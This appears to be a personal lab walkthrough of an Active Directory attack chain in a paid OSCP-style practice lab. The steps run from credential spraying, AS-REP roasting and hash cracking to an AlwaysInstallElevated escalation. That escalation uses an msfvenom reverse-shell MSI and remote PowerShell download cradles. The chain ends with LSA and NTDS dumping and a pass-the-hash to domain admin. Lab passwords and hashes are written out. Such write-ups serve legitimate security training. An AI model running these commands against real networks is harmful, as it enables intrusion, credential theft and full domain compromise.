---
Category: OSCP - TjNull
LAB: https://buymeacoffee.com/hackacademy/e/476963
Difficulty:
Featured:
aliases:
---

---
# Information / Description


DISCOUNT-487C2 <-- discount code for academy


Starting credentials for the lab:

```
lfoster : Pindrop#1
```

---

# Walkthrough


We will start by checking the credentials against all machines

```
netexec smb 10.0.2.0/24 -u 'lfoster' -p 'Pindrop#1'
```

![](../0.%20Assets/AD%20Chain%203-1793349085858.webp)

Okay they are valid everywhere

Now I will test all the credentials against all the protocols for all machines with the little tool [nxspray](https://github.com/MarcussanMG/nxcspray) to see what we can do with the credentials

```
./nxcspray all 10.0.2.0/24 -u 'lfoster' -p 'Pindrop#1'
```

this will take a while so in the mean time I will check for shares for the user and the anonymous user


![](../0.%20Assets/AD%20Chain%203-1793349545452.webp)

nothring really interesting let's see with the credentials we have 

![](../0.%20Assets/AD%20Chain%203-1793349273365.webp)

Nothing specially interesting either, let's see how the spray is going

![](../0.%20Assets/AD%20Chain%203-1793349578215.webp)![](../0.%20Assets/AD%20Chain%203-1793349611790.webp)![](../0.%20Assets/AD%20Chain%203-1793349618196.webp)

Okay for now we can query the `LDAP` and `RDP` to client2 with user `lfoster`, let's do both  to see what we can encounter

```
ldapdomaindump -u 'hack-academy.local\lfoster' -p 'Pindrop#1'  $T
```

Didn't find anything specially interesting in there so I will move to the `RDP`

```
xfreerdp /v:10.0.2.5 /u:'lfoster' /p:'Pindrop#1' /cert:ignore +clipboard /dynamic-resolution
```

![](../0.%20Assets/AD%20Chain%203-1793349952129.webp)

this is what we encounter, let's get from our machine some tools to privesc and maybe get some local admin or data

```
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://<your-ip>/PowerUp.ps1'); Invoke-AllChecks"
```

Didn't find much with powerup, so I moved to ``Winpeas`` I decided to send me a reverse shell with `penelope` so the colors of ``winpeas`` appear

![](../0.%20Assets/AD%20Chain%203-1793350266587.webp)![|837x175](../0.%20Assets/AD%20Chain%203-1793350271918.webp)


Didn't find much so I moved to bloodhound

```
bloodhound-python -u 'lfoster@hack-academy.local' -p 'Pindrop#1' -d hack-academy.local -dc dc01.hack-academy.local -ns 10.0.2.4 -c All --zip
````


Again not much either

![](../0.%20Assets/AD%20Chain%203-1793351740505.webp)

Tried as-reproasting

```
impacket-GetNPUsers -request -dc-ip $T -outputfile hashes.asreproast "hack-academy.local/lfoster"
```

![](../0.%20Assets/AD%20Chain%203-1793351836491.webp)

Great we get a hash
let's crack it

```
john hashes.asreproast -w=/usr/share/wordlists/rockyou.txt
```

![](../0.%20Assets/AD%20Chain%203-1793351919319.webp)

Let's test the credentials against all machines

![](../0.%20Assets/AD%20Chain%203-1793351947640.webp)

```
./nxcspray all 10.0.2.0/24 -u 'adiaz' -p 'Peru123.'
```

We have rdp access

![](../0.%20Assets/AD%20Chain%203-1793352225641.webp)

Didn't find much so I tried with `PrivescCheck` which takes a very long time but sometimes it finds interesting stuff

```
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.0.2.6/PrivescCheck.ps1'); Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_Full -Format HTML"
```

Bingo

![](../0.%20Assets/AD%20Chain%203-1793367913572.webp)

`AlwaysInstallElevated` appears to be our way in

Let's generate a fake `.msi` and install it

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.6 LPORT=443 -f msi -o evil.msi
```

![[AD Chain 3-1793354216896.webp]]

let's start a listener
![](../0.%20Assets/AD%20Chain%203-1793354249776.webp)

Download the `.msi` in the client and install it (we got here from the rdp connection with `adiaz`)

```
msiexec /quiet /qn /i C:\Users\adiaz\evil.msi
```

![](../0.%20Assets/AD%20Chain%203-1793354254496.webp)

And we get the reverse shell

![](../0.%20Assets/AD%20Chain%203-1793354260204.webp)

add the user adiaz to administrators so we can dump 

```
Add-LocalGroupMember -Group "Administrators" -Member "adiaz"  
```

![](../0.%20Assets/AD%20Chain%203-1793355625378.webp)

![](../0.%20Assets/AD%20Chain%203-1793355636917.webp)

![](../0.%20Assets/AD%20Chain%203-1793355822675.webp)![](../0.%20Assets/AD%20Chain%203-1793355842244.webp)

```
netexec smb $T -u 'adiaz' -p 'Peru123.' --lsa | awk '{print $5}' | fgrep '/' | sed -E 's/^[^:]+\/([^:]+):/\1#/' | sed 's/:$//' | sed 's/^[^#]*#//' | tee mscash_hashes_perfect  

hashcat -m 2100 -a 0 mscash_hashes_perfect /usr/share/wordlists/rockyou.txt
```



![](../0.%20Assets/AD%20Chain%203-1793357538245.webp)

![](../0.%20Assets/AD%20Chain%203-1793357598248.webp)

![](../0.%20Assets/AD%20Chain%203-1793359216874.webp)

![](../0.%20Assets/AD%20Chain%203-1793359711861.webp)

![](../0.%20Assets/AD%20Chain%203-1793359795542.webp)


![](../0.%20Assets/AD%20Chain%203-1793359857868.webp)

![](../0.%20Assets/AD%20Chain%203-1793359894911.webp)

let's see what we can do with these hashes

![](../0.%20Assets/AD%20Chain%203-1793363108804.webp)

I was stuck for a bit but brian is not a domain user

![](../0.%20Assets/AD%20Chain%203-1793363225958.webp)


but we hit this restriction

![](../0.%20Assets/AD%20Chain%203-1793363340638.webp)

so we need to crack the hash

when we crack it we see that because of special characters `hashcat` shows the output in `hex`

we can turn that arround with this command

```
echo "496c6f7665796f753a44" | xxd -r -p; echo "" 
```

![](../0.%20Assets/AD%20Chain%203-1793363327810.webp)

```
xfreerdp /v:10.0.2.3 /u:'Brian' /p:''Iloveyou:D'' /cert:ignore +clipboard /dynamic-resolution
```

![](../0.%20Assets/AD%20Chain%203-1793364633609.webp)

- **SAM (Security Account Manager):** Stores **local machine accounts** only. You get NTLM hashes for users that only exist on that specific computer.
- **LSA Secrets (Local Security Authority):** Stores **system and domain infrastructure secrets**. You get service account passwords, computer account passwords, and sometimes cleartext domain credentials.
As a local admin, you were trapped in a box. Windows blocked you from reaching the LSA secrets over the network because of **Remote UAC filtering**.

By adding a **Domain User** to the local administrators group, you bypassed that security filter entirely. It gave you the full, unrestricted token needed to unlock `HKLM\SECURITY` and extract those high-value domain secrets.

**In short:** SAM gives you the keys to the room. LSA gives you the keys to the castle. The domain user trick is the lockpick that gets you from the room to the castle.

So let's do that

```
Add-LocalGroupMember -Group "Administrators" -Member "jbailey"
```

![](../0.%20Assets/AD%20Chain%203-1793365239222.webp)

![](../0.%20Assets/AD%20Chain%203-1793365268331.webp)

```
netexec smb 10.0.2.0/24 -u 'jbailey' -p 'Paulio*3' --lsa
```

![](../0.%20Assets/AD%20Chain%203-1793365395667.webp)

```
netexec smb 10.0.2.0/24 -u 'jbailey' -p 'Paulio*3' --lsa | awk '{print $5}' | fgrep '/' | sed -E 's/^[^:]+\/([^:]+):/\1#/' | sed 's/:$//' | sed 's/^[^#]*#//' | tee mscash_hashes
```

![](../0.%20Assets/AD%20Chain%203-1793365409891.webp)

```
john mscash_hashes -w=/usr/share/wordlists/rockyou.txt -format=mscash2 
```

![](../0.%20Assets/AD%20Chain%203-1793366249635.webp)

And `amorales` is an admin in DC01

![](../0.%20Assets/AD%20Chain%203-1793366330394.webp)

and now we can dump `NTDS` which is the GOAT

```
netexec smb 10.0.2.4 -u 'amorales' -p 'Seduction?1' --ntds
```

![](../0.%20Assets/AD%20Chain%203-1793366557143.webp)

Finally we can do a `pass the hash` with the administrator hash

```
impacket-psexec hack-academy.local/Administrator@10.0.2.4 -hashes :c0ced2de918b4a7c1b9f4efd225dd503
```

![](../0.%20Assets/AD%20Chain%203-1793366811542.webp)

And we are in DC01 as domain admin